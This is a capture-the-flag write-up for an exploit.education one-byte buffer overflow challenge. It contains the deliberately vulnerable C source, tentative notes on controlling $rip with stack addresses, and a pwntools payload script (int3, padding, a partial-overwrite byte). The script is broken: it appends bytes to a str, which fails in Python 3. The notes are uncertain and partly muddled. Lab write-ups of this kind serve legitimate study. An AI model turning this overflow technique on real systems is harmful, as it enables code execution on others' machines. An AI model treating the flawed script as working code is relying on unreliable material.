# Challenge Source Code
```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
    "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *what = GREET;

char *greet(char *who) {
    char buffer[128];
    int maxSize;

    maxSize = strlen(who);
    if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
}

    strcpy(buffer, what);
    strncpy(buffer + strlen(buffer), who, maxSize);

    return strdup(buffer);
}

int main(int argc, char **argv) {
    char *ptr;
    printf("%s\n", BANNER);

#ifdef NEWARCH
    if (argv[1]) {
        what = argv[1];
    }
#endif

    ptr = getenv("ExploitEducation");
    if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, "Please specify an environment variable called ExploitEducation");
    }

    printf("%s\n", greet(ptr));
    return 0;
}
```
# Challenge Theory
This challenge is a 1 byte buffer overflow.
You have overwrite a single byte and then point it to something to get code execution.
# Working on the Challenge
Setting the environment variable "ExploitEducation" outside of gdb will be done.
This way the env can be set with scripts.
Also the "GREET" macro simply creates the string "Welcome, I am pleased to meet you".
Currently using string from the range 128 to 144 bytes in length to get the "greet" function to return garbage values into the $rip register.
136 bytes specifically causes the 0x0 to be put into $rip, but anything larger will end up putting some kind of random address into $rip.
The values are not useful, and do not yield much info into what is going with the program.
They do have something to do with the return of strdup, or strcpy. 
## Variables
```
user input is stored in stack address : 0x00007fffffffe638 mem address : 0x00007fffffffef8c
GREET macro(length 34) = "Welcome, I am pleased to meet you " 
```
# One liner with code execution
Script to generate payload
```
#!/usr/bin/python3
from pwn import *
import sys
context.arch = 'amd64'

payload = ""
payload += asm('int3')
payload += b"A"*160
payload += b"\x8c"

sys.stdout.buffer.write(payload)
```

